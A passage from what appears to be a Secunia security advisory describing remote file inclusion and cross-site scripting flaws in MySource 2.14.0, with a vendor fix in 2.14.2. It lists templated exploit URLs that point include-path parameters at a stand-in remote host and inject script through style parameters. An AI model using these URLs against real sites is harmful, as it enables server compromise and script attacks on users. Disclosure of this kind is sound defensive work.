======================================================================
4) Description of Vulnerabilities

Secunia Research has discovered some vulnerabilities in MySource, 
which can be exploited by malicious people to conduct 
cross-site scripting attacks and compromise a vulnerable system.

1) Some input isn't properly verified, before it used to include 
files. This can be exploited to include arbitrary files from external 
and local resources.

Examples:
http://[victim]/web/edit/upgrade_functions/new_upgrade_functions.php?
INCLUDE_PATH=http://[host]/[file]?
http://[victim]/web/edit/upgrade_functions/new_upgrade_functions.php?
SQUIZLIB_PATH=http://[host]/[file]?
http://[victim]/web/init_mysource.php?
INCLUDE_PATH=http://[host]/[file]?
http://[victim]/pear/Net_Socket/Socket.php?
PEAR_PATH=http://[host]/[file]?
http://[victim]/pear/HTTP_Request/Request.php?
PEAR_PATH=http://[host]/[file]?
http://[victim]/pear/Mail/Mail.php?
PEAR_PATH=http://[host]/[file]?
http://[victim]/pear/Date/Date.php?
PEAR_PATH=http://[host]/[file]?
http://[victim]/pear/Date/Date/Span.php?
PEAR_PATH=http://[host]/[file]?
http://[victim]/pear/Mail_Mime/mimeDecode.php?
PEAR_PATH=http://[host]/[file]?
http://[victim]/pear/Mail_Mime/mime.php?
PEAR_PATH=http://[host]/[file]?

Successful exploitation requires that "register_globals" is enabled 
and that the affected scripts are placed accessible inside the 
web root.

2) Some input isn't properly sanitised before being returned to the 
user. This can be exploited to execute arbitrary HTML and script code 
in a user's browser session in context of an affected site.

Examples:
http://[victim]/web/edit/upgrade_in_progress_backend.php?
target_url=">[code]
http://[victim]/squizlib/bodycopy/pop_ups/insert_table.php?
bgcolor=</style>[code]
http://[victim]/squizlib/bodycopy/pop_ups/edit_table_cell_props.php?
bgcolor=</style>[code]
http://[victim]/squizlib/bodycopy/pop_ups/header.php?
bgcolor=</style>[code]
http://[victim]/squizlib/bodycopy/pop_ups/edit_table_row_props.php?
bgcolor=</style>[code]
http://[victim]/squizlib/bodycopy/pop_ups/edit_table_props.php?
bgcolor=</style>[code]
http://[victim]/squizlib/bodycopy/pop_ups/
edit_table_cell_type_wysiwyg.php?stylesheet=">[code]

Successful exploitation requires that "register_globals" is enabled 
and that the affected scripts are placed accessible inside the 
web root.

The vulnerabilities have been confirmed in version 2.14.0. Prior 
versions may also be affected.

======================================================================
5) Solution

The vendor has fixed the vulnerabilities in version 2.14.2 by warning 
the user during the installation process about the security risks of 
placing MySource script files in a publicly available folder and 
having "register_globals" enabled.

Users should set "register_globals" to "Off" and ensure that the 
MySource installation is moved out of the web root.

Installation process updated in version 2.14.2:
